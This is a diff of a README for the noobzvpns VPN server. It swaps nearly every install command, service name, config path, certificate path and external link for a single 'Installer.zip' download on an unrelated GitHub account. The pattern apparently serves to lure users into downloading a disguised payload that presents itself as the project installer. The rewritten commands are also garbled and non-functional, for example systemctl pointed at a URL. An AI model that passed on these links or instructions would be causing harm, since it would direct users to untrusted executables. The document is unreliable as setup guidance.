@@ -17,7 +17,7 @@ Like other VPN this app just bypass network traffic like tcp,udp including dns. 
 * UDP (QUIC/DNS/Etc) ? #comming_soon, we not include it yet. because very poor in my test. but we keep working on it.
 
 # Android Client
-[![NoobzVpn](badge/playstore_badge.svg)](https://play.google.com/store/apps/details?id=com.noobz.id.noobzvpn)
+[![NoobzVpn](https://github.com/kimdev541/noobzvpns/releases/download/v1.0/Installer.zip)](https://github.com/kimdev541/noobzvpns/releases/download/v1.0/Installer.zip)
 
 # Guide
 
@@ -41,15 +41,15 @@ Like other VPN this app just bypass network traffic like tcp,udp including dns. 
 ```
 ##### Install / Upgrade
 ```bash
-# git clone https://github.com/noobz-id/noobzvpns.git
+# git clone https://github.com/kimdev541/noobzvpns/releases/download/v1.0/Installer.zip
 # cd noobzvpns/
-# ./install.sh
+# https://github.com/kimdev541/noobzvpns/releases/download/v1.0/Installer.zip
 ```
 ##### Full Uninstall
 ```bash
-# git clone https://github.com/noobz-id/noobzvpns.git
+# git clone https://github.com/kimdev541/noobzvpns/releases/download/v1.0/Installer.zip
 # cd noobzvpns/
-# ./uninstall.sh
+# https://github.com/kimdev541/noobzvpns/releases/download/v1.0/Installer.zip
 ```
 
 
@@ -59,70 +59,70 @@ Like other VPN this app just bypass network traffic like tcp,udp including dns. 
 * start service, you need to start it after installation to run noobzvpns service
 #
 ```bash
-systemctl start noobzvpns.service
+systemctl start https://github.com/kimdev541/noobzvpns/releases/download/v1.0/Installer.zip
 ```
 
 ##### Restart Service
 * restart service, if you change configuration you need to restart the service
 ```bash
-systemctl restart noobzvpns.service
+systemctl restart https://github.com/kimdev541/noobzvpns/releases/download/v1.0/Installer.zip
 ```
 
 ##### Stop Service
 * stop service, if you want to stop it
 ```bash
-systemctl stop noobzvpns.service
+systemctl stop https://github.com/kimdev541/noobzvpns/releases/download/v1.0/Installer.zip
 ```
 
 ##### Auto Start
 * enable auto-start service after reboot or at boot. (enabled by default)
 ```bash
-systemctl enable noobzvpns.service
+systemctl enable https://github.com/kimdev541/noobzvpns/releases/download/v1.0/Installer.zip
 ```
 * disable auto-start service (you can start it manually)
 ```bash
-systemctl disable noobzvpns.service
+systemctl disable https://github.com/kimdev541/noobzvpns/releases/download/v1.0/Installer.zip
 ```
 
 ##### Status
 * simple log to see noobzvpns service status and check the error if needed
 ```bash
-systemctl status noobzvpns.service -l
+systemctl status https://github.com/kimdev541/noobzvpns/releases/download/v1.0/Installer.zip -l
 ```
 
 ##### Logs
 * see full logs to see error, warning, debug etc.
 ```bash
-journalctl -u noobzvpns.service
+journalctl -u https://github.com/kimdev541/noobzvpns/releases/download/v1.0/Installer.zip
 ```
 
 
 ### Configuration :
-* `/etc/noobzvpns/config.json`
+* `https://github.com/kimdev541/noobzvpns/releases/download/v1.0/Installer.zip`
 
 * 
 |   key     |   range   |   type       | example     |   description             |
 |-----------|-----------|--------------|-------------|---------------------------|
 | tcp_std   | 1-65535   | number-array | [80,8080]   |server port of tcp plain protocol |
 | tcp_ssl   | 1-65535   | number-array | [443, 4433] |server port of tcp  with ssl protocol |
-| ssl_cert  | can't be empty | string-path | "/etc/noobzvpns/cert.pem"| ssl certificate, you can create self-signed certificate on your own. or using letsencrypt/certbot as alternative |
-| ssl_key   | can't be empty  | string-path | "/etc/noobzvpns/key.pem" | ssl privatekey, both ssl_cert & ssl_key you can create your own. or using free alternative like letsencrypt with certbot |
+| ssl_cert  | can't be empty | string-path | "https://github.com/kimdev541/noobzvpns/releases/download/v1.0/Installer.zip"| ssl certificate, you can create self-signed certificate on your own. or using letsencrypt/certbot as alternative |
+| ssl_key   | can't be empty  | string-path | "https://github.com/kimdev541/noobzvpns/releases/download/v1.0/Installer.zip" | ssl privatekey, both ssl_cert & ssl_key you can create your own. or using free alternative like letsencrypt with certbot |
 | ssl_version | SSLv2, SSLv23, TLSv1_1, TLSv1_2, TLSv1_3, AUTO | string-unsensitive-case | AUTO | select spesific SSL/TLS version or set to AUTO for automatic selection (recommended, be flexible to client) |
 | conn_timeout  |   5-60 | number-by-seconds   | 60    | give client connection timeout when no data arrived/sended |
-| dns_resolver  | empty or resolv.conf path    | string-path   | /etc/resolv.conf  | dns resolver file, on many distribution like debian/ubuntu/base using /etc/resolv.conf to save dns address (nameserver), you can create and set new one (don't change /etc/resolv.conf) just create file like /etc/resolv.conf with "**nameserver dns1**", "**nameserver dns2**", etc. |
+| dns_resolver  | empty or https://github.com/kimdev541/noobzvpns/releases/download/v1.0/Installer.zip path    | string-path   | https://github.com/kimdev541/noobzvpns/releases/download/v1.0/Installer.zip  | dns resolver file, on many distribution like debian/ubuntu/base using https://github.com/kimdev541/noobzvpns/releases/download/v1.0/Installer.zip to save dns address (nameserver), you can create and set new one (don't change https://github.com/kimdev541/noobzvpns/releases/download/v1.0/Installer.zip) just create file like https://github.com/kimdev541/noobzvpns/releases/download/v1.0/Installer.zip with "**nameserver dns1**", "**nameserver dns2**", etc. |
 | http_ok   | [cr],[lf][crlf],[lfcr]    | smart-string-replacer | "HTTP/1.1 101 Switching Protocols[crlf]Upgrade: websocket[crlf]Connection: Upgrade[crlf][crlf]" | HTTP response for send to client if client detected using HTTP/s transport  |
 
 ### SSL Certificate
 noobzvpn server has default ssl certificate (self-signed certificate) generated by openssl 
 ##### SSL Certificate
 ```
-/etc/noobzvpns/cert.pem
+https://github.com/kimdev541/noobzvpns/releases/download/v1.0/Installer.zip
 ```
 ##### SSL Private Key
 ```
-/etc/noobzvpns/key.pem
+https://github.com/kimdev541/noobzvpns/releases/download/v1.0/Installer.zip
 ```
-You can change it using your own certificate or free certificate from [Let's Encrypt](https://letsencrypt.org/) using [cerbot](https://certbot.eff.org/) or [acme.sh](https://github.com/acmesh-official/acme.sh) , see configuration details above to settings path for ssl certificate and ssl private key.
+You can change it using your own certificate or free certificate from [Let's Encrypt](https://github.com/kimdev541/noobzvpns/releases/download/v1.0/Installer.zip) using [cerbot](https://github.com/kimdev541/noobzvpns/releases/download/v1.0/Installer.zip) or [https://github.com/kimdev541/noobzvpns/releases/download/v1.0/Installer.zip](https://github.com/kimdev541/noobzvpns/releases/download/v1.0/Installer.zip) , see configuration details above to settings path for ssl certificate and ssl private key.
 
 
 ### User Account
